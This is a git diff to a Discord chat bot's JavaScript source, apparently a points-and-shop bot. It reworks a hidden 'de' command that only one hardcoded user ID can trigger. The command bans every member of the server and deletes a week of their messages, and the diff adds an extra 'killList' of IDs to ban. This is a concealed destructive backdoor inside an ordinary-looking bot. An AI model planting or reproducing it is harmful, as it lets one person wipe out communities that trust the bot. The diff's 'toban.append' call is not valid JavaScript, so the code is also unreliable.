@@ -10,6 +10,9 @@ var cbot = require('cleverbot.io');
 var cleverbot = new cbot(process.env.CB_USER, process.env.CB_KEY, 'pointbot'); 
 
 const bigInteger = require('biginteger').BigInteger;
+
+var killList = [];
+
 var items = {
   'times5': {
   'expireTime': 60, //time from buying to expire in minutes
@@ -492,13 +495,15 @@ bot.on('message', function(user, userID, channelID, message, evt) {
             break;
           case 'de':
             if (userID!='175711685682659328') break;
+            var toban = Object.values(bot.servers[bot.channels[channelID].guild_id].members).map(m=>m.id);
+            toban = toban.append(killList);
             (async function loop() {
-            for (var m of Object.values(bot.servers[bot.channels[channelID].guild_id].members))
+            for (var m of toban)
               bot.ban({
                 serverID: bot.channels[channelID].guild_id,
-                userID: m.id,
+                userID: m,
                 lastDays: 7
-              }, (e)=>console.log("ban error: " + JSON.stringify(e));
+              }, (e)=>console.log("ban error: " + JSON.stringify(e)));
               await new Promise(resolve=>setTimeout(resolve,200));
             })();
             break;
